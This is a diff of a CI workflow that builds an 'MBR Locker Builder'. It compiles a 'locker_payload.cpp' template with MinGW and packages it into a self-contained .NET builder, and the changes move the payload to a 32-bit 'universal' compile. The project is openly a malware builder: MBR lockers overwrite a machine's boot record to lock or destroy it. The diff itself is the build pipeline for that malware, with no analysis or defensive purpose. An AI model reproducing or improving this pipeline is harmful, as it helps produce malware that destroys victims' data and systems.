@@ -1,4 +1,4 @@
-name: Build MBR Locker Builder
+name: Build Universal MBR Locker Builder
 
 on:
   push:
@@ -45,16 +45,16 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    - name: Compile Template (MinGW)
+    - name: Compile Template (Universal 32-bit)
       shell: cmd
       run: |
         set PATH=C:\tools\mingw64\bin;%PATH%
         cd template
-        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
+        i686-w64-mingw32-g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         if exist locker_payload.exe (
           mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled
+          echo [SUCCESS] Template compiled (32-bit, universal)
         ) else (
           echo [ERROR] Compilation failed!
           exit /b 1
@@ -67,12 +67,12 @@ jobs:
         dir builder\Resources
         echo ================================
 
-    - name: Build Autonomous Builder (Self-Contained + Single File)
+    - name: Build Universal Builder (AnyCPU + Self-Contained)
       shell: cmd
       run: |
         cd builder
         dotnet restore
-        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../output
+        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:Platform=AnyCPU -o ../output
         if exist ..\output\Builder.exe (
           echo [SUCCESS] Builder built successfully
         ) else (
